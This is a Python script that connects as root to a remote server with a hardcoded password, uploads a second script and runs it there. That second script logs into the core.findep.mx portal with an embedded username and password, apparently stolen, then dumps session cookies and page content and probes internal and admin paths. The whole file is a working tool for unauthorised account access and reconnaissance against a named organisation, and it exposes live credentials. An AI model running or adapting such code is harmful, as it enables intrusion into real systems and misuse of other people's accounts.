import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

sys.stdout.write("=== CORE jcruzval:Fisa1234* DEEP ANALYSIS ===\n\n")

# 1. Get fresh login page
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""

# 2. Login
r = s.post(
    "https://core.findep.mx/valida.do",
    data={
        "cve_idToken": tok,
        "msjPass": "",
        "cveUsr": "jcruzval",
        "cve_usr": "jcruzval",
        "cve_psd": "Fisa1234*",
        "ok_btn": "Entrar"
    },
    allow_redirects=True,
    timeout=15
)

sys.stdout.write(f"Status: {r.status_code}\n")
sys.stdout.write(f"URL: {r.url}\n")
sys.stdout.write(f"Size: {len(r.text)}b\n")
sys.stdout.write(f"History: {[(h.status_code, h.headers.get('Location','')) for h in r.history]}\n")
sys.stdout.write(f"Cookies: {dict(s.cookies)}\n\n")

# Extract title
title = re.search(r'<title>(.*?)</title>', r.text[:3000])
sys.stdout.write(f"Title: {title.group(1) if title else 'N/A'}\n")

# Extract forms
forms = re.findall(r'action="([^"]*)"', r.text)
sys.stdout.write(f"Forms: {forms[:10]}\n")

# Extract links
links = re.findall(r'href="([^"]*\.do[^"]*)"', r.text)
sys.stdout.write(f"Struts .do links: {links[:20]}\n")

# Extract JS includes
scripts = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
sys.stdout.write(f"JS: {scripts[:10]}\n")

# Look for menu items / dashboard elements
menus = re.findall(r'class="[^"]*menu[^"]*"[^>]*>([^<]+)', r.text, re.I)
sys.stdout.write(f"Menu items: {menus[:20]}\n")

# Check for error messages
errors = re.findall(r'(?:error|alert|warning|invalid|incorrecto|bloqueado|expirad)[^<]{0,200}', r.text, re.I)
sys.stdout.write(f"Errors/Warnings: {errors[:10]}\n")

# Check for password change form
if "cambiar" in r.text.lower() or "password" in r.text.lower() or "contrase" in r.text.lower():
    sys.stdout.write(f"\n*** PASSWORD CHANGE OR EXPIRY DETECTED ***\n")
    # Extract relevant section
    pw_section = re.findall(r'(?:cambiar|password|contrase)[^<]{0,500}', r.text, re.I)
    sys.stdout.write(f"Context: {pw_section[:3]}\n")

# Dump key parts of HTML
sys.stdout.write(f"\n=== BODY HEAD (first 2000 chars) ===\n{r.text[:2000]}\n")
sys.stdout.write(f"\n=== BODY TAIL (last 1000 chars) ===\n{r.text[-1000:]}\n")

# 3. If logged in, try to access internal pages
if len(r.text) > 15000:
    sys.stdout.write(f"\n=== FOLLOWING UP - ACCESSING INTERNAL PAGES ===\n")
    internal_paths = [
        "/inicio.do", "/menu.do", "/dashboard.do",
        "/perfil.do", "/buscar.do", "/reporte.do",
        "/configuracion.do", "/admin.do",
        "/cambiarPassword.do", "/cambio_password.do",
    ]
    for path in internal_paths:
        try:
            r2 = s.get(f"https://core.findep.mx{path}", timeout=10, allow_redirects=False)
            sys.stdout.write(f"  [{r2.status_code}] {path} ({len(r2.text)}b)\n")
            if r2.status_code == 200 and len(r2.text) > 1000:
                t = re.search(r'<title>(.*?)</title>', r2.text[:1000])
                sys.stdout.write(f"    Title: {t.group(1) if t else 'N/A'}\n")
        except:
            pass
        sys.stdout.flush()

sys.stdout.write(f"\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_jcruzval.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_jcruzval.py 2>&1', timeout=120)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
